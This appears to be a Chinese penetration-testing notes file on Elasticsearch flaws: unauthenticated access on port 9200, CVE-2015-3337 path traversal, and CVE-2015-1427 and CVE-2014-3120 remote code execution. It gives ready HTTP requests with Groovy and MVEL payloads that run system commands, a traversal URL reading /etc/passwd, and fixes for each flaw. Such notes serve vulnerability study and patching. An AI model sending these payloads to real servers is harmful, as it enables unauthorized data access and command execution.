# elasticsearch

## 一、elsaticsearch未授权访问漏洞
### 漏洞说明
Elasticsearch服务普遍存在一个未授权访问的问题，攻击者通常可以请求一个开放9200或9300的服务器进行恶意攻击。

### 影响范围
/

### 验证方法
**手工验证**
http://localhost:9200/_cat/indices
http://localhost:9200/_river/_search 查看数据库敏感信息
http://localhost:9200/_nodes 查看节点数据

**pocsuite**
poc_elasticsearch_unauth.py

### 利用方法

### 修复方法
1. 限制IP访问，绑定固定IP
2. 在config/elasticsearch.yml中为9200端口设置认证：
```vim
http.basic.enabled true #开关，开启会接管全部HTTP连接
http.basic.user "admin" #账号
http.basic.password "admin_pw" #密码
http.basic.ipwhitelist ["localhost", "127.0.0.1"]
```

## 二、目录遍历漏洞（cve-2015-3337)
### 漏洞说明
安装 “site” 功能的插件后，插件目录使用…/ 向上跳转，导致目录穿越漏洞，可读取任意文件。未安装 site 功能插件的不受影响  
/_cat/plugins：查看所有已安装的插件

### 影响范围
1.4.5以下/1.5.2以下

### 验证方法
一般复现以 head 插件为例，若查看存在 head 插件，burp  
访问

```
http://your-ip:9200/_plugin/head/../../../../../../../../../etc/passwd
```
参考：https://blog.csdn.net/qq_36374896/article/details/84145527

### 利用方法
/
### 修复方法
升级elasticsearch版本

## 三、CVE-2015-1427 任意命令执行
### 漏洞说明
ElasticSearch默认的动态脚本语言换成了Groovy，并增加了沙盒，但默认仍然支持直接执行动态语言。本漏洞：1.是一个沙盒绕过； 2.是一个Goovy代码执行漏洞。
### 涉及范围
es 1.4.2
### 验证方法
**手工验证**
1. 插入数据：
```
POST /website/blog/ HTTP/1.1
Host: ip:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
{
  "name": "test"
}

```
2. 执行 JAVA 代码
```
POST /_search?pretty HTTP/1.1
Host: ip:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/text
Content-Length: 489
{
    "size":1,
    "script_fields": {
        "test#": {  
            "script":
                "java.lang.Math.class.forName(\"java.io.BufferedReader\").getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(\"java.io.InputStreamReader\").getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getInputStream())).readLines()",
            "lang": "groovy"
        }
    }
}
```
3. 利用 Groovy 执行命令

```
POST /_search?pretty HTTP/1.1
Host: 192.168.91.130:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/text
Content-Length: 156
{"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}
```
### 修复方式
升级es版本



## 四：cve-2014-3120 命令执行
### 漏洞说明
老版本ElasticSearch支持传入动态脚本（MVEL）来执行一些复杂的操作，而MVEL可执行Java代码，而且没有沙盒，所以我们可以直接执行任意代码。
### 涉及范围
es:1.1.1


### 验证方法
1. 加入一条数据
```
POST /website/blog/ HTTP/1.1
Host: 192.168.15.130:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
{
  "name": "phithon"
}

```

2. 代码执行

```
POST /_search?pretty HTTP/1.1
Host: 192.168.15.130:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 343
{
    "size": 1,
    "query": {
      "filtered": {
        "query": {
          "match_all": {
          }
        }
      }
    },
    "script_fields": {
        "command": {
            "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"
        }
    }
}
```

### 修复方式
升级es版本